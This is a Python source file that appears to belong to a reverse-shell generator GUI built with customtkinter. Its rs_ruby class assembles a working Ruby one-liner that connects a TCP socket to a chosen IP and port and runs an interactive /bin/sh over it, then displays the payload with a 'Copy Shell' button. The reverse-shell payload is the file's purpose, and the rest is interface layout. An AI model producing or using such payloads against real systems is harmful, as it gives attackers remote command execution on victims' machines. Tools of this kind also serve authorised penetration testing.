import customtkinter, pyperclip
from modules.get import select_list as shell_list
from modules.activate import Activate

def select_callback(self):
    self.rs_selected = self.select_shell_var.get()
    Activate.update_rs(self)

class rs_ruby:

    def __init__(self, RSGeneratorApp) -> None:

        self = RSGeneratorApp

        shell_parts = {
            1: "ruby -rsocket -e'f=TCPSocket.open(",
            2: f'"{self.ip_selected}",{self.port_selected}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)',
            3: "'",
        }

        shell = ''.join(shell_parts.values())

        self.rs_ruby_label_frame = customtkinter.CTkFrame(self.rs_frame)
        self.rs_ruby_label_frame.grid(row=1, column=0, padx=10, pady=10, sticky="ew", columnspan=2)

        self.rs_ruby_select_shell = customtkinter.CTkOptionMenu(self.rs_ruby_label_frame, variable=self.select_shell_var, command=lambda value:select_callback(self), fg_color=self.colormain,button_color=self.color_optionbtn, button_hover_color=self.color_hover)
        self.rs_ruby_select_shell.configure(values=shell_list())
        self.rs_ruby_select_shell.grid(row=1, column=0, padx=10, pady=10, sticky="ew", columnspan=2)
        self.rs_ruby_label_frame.grid_columnconfigure(1, weight=1)

        self.no_option_frame.grid(row=1, column=2, padx=10, pady=10, sticky="ew", columnspan=2)
        self.no_option_label.grid(row=1, column=1, padx=10, pady=10, sticky="ew")

        label = customtkinter.CTkTextbox(self.rs_frame,)
        label.insert("0.0", text=shell);label.configure(state="disabled")
        label.grid(row=2, column=0, columnspan=4, padx=10, pady=10, sticky="ew")

        btn_copy = customtkinter.CTkButton(self.rs_frame,hover_color=self.color_hover, text="Copy Shell", command=lambda: pyperclip.copy(str(shell)))
        btn_copy.grid(row=3, column=0, columnspan=4, padx=10, pady=10, sticky="ew")
        btn_copy.configure(fg_color=self.colormain)
        